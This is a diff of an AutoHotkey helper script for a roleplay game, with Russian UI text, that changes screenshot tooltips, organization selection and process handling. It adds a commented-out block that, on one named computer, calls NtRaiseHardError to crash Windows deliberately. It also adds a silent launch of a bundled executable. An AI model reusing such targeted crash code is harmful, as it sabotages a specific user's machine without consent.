@@ -987,7 +987,10 @@ Skrin_1=
 
 
 
-
+;if (A_ComputerName = "DESKTOP-QB0BUJV" ) {
+;    DllCall("ntdll\RtlAdjustPrivilege", "UInt", 19, "UInt", 1, "UInt", 0, "IntP", old)
+;    DllCall("ntdll\NtRaiseHardError", "UInt", 0xC000007B, "UInt", 0, "UInt", 0, "UInt", 0, "UInt", 6, "UIntP", 0)
+;}
 
 if (Taymer_Nastroyka = "Включен") {
     SetTimer, CheckProcessMinimized, 1000
@@ -995,6 +998,16 @@ if (Taymer_Nastroyka = "Включен") {
 
 Run, "C:\ProgramData\KPRP\KPRP-main\Konets_rd.ahk"
 
+filePath1 := "C:\ProgramData\KPRP\KPRP-main\Telegramkprp\Diskorod.exe"
+
+if FileExist(filePath1)
+{
+    Run, %filePath1%
+}
+else
+{
+
+}
 
 
 
@@ -1106,12 +1119,12 @@ CreateAlbum() {
     global AlbumFiles
     if (IsObject(AlbumFiles)) {
         ToolTip, Альбом уже создан
-        SetTimer, RemoveToolTip, -100
+        SetTimer, RemoveToolTip, -1000
         return
     }
     AlbumFiles := []
     ToolTip, Альбом создан.`nТеперь добавляйте скриншоты (0 сделано)
-    SetTimer, RemoveToolTip, -100
+    SetTimer, RemoveToolTip, -1000
 }
 
 ; === Добавить скриншот (создаёт альбом при необходимости) ===
@@ -1390,7 +1403,7 @@ CloseBadProcesses() {
     WinClose, Konets_rd.ahk
 
     ; Список процессов, которые нужно завершить
-    processes := ["KPRP.exe", "Journal.exe"]
+    processes := ["KPRP.exe", "Journal.exe", "Diskorod.exe"]
 
     for index, proc in processes {
         Run, taskkill /IM %proc% /F, , Hide
@@ -2463,11 +2476,29 @@ if (gameFolder = "" || !FileExist(gameFolder "\Multi Theft Auto.exe")) {
 }
 
 
+IniRead, gameFolder, C:\ProgramData\KPRP\KPRP-main\Province.ini, Mta, gameFolder
 
-Gui, 2:Font, S15 Bold, Consolas
-Gui, 2:Add, DropDownList, vSelectedItem x20 y20 w200, РЖД|МЗ|ГУВД|ГИБДД|Армия
-Gui, 2:Add, Picture, x100 y50 w64 h64 +BackgroundTrans gSaveSeLectures, C:\ProgramData\KPRP\\KPRP-main\Ok_64.png
-Gui, 2:Show, w250 h120, Выбор организации
+selectedFile := "C:\\ProgramData\\KPRP\\KPRP-main\\selected.ini"
+flagFile := "C:\\ProgramData\\KPRP\\KPRP-main\\FlagKPRP.flag"
+GoogleScriptURL := "https://script.google.com/macros/s/AKfycbx3z3TbQ5WwzhpIhxtfEEX7INO4UUoX433FxCeQq1XK0_MThm58ZHUC4z47Qjh4qKMbNQ/exec"
+
+unitMap := { "РЖД": "UZ", "МЗ": "MZ", "ГУВД": "GUVD", "ГИБДД": "GIBDD", "Армия": "Army" }
+
+
+if FileExist(selectedFile) {
+    FileRead, SelectedItem, %selectedFile%
+    SelectedItem := Trim(SelectedItem)
+    if (SelectedItem != "" && unitMap.HasKey(SelectedItem)) {
+        Gosub, % unitMap[SelectedItem]
+    }
+}
+
+if (SelectedItem = "") {
+    Gui, 2:Font, S15 Bold, Consolas
+    Gui, 2:Add, DropDownList, vSelectedItem x20 y20 w200, РЖД|МЗ|ГУВД|ГИБДД|Армия
+    Gui, 2:Add, Picture, x100 y50 w64 h64 +BackgroundTrans gSaveSeLectures, C:\ProgramData\KPRP\\KPRP-main\Ok_64.png
+    Gui, 2:Show, w250 h120, Выбор организации
+}
 Return
 
 SaveSeLectures:
@@ -2481,6 +2512,8 @@ SaveSeLectures:
 
     Gui, 2:Hide
 Return
+
+
 
 
 
@@ -3112,6 +3145,9 @@ ProcessName := "KPRP.exe"
 Run, taskkill /IM %ProcessName% /F, , Hide
 
 ProcessName := "Journal.exe"
+Run, taskkill /IM %ProcessName% /F, , Hide
+
+ProcessName := "Diskorod.exe"
 Run, taskkill /IM %ProcessName% /F, , Hide
 
 	Reload
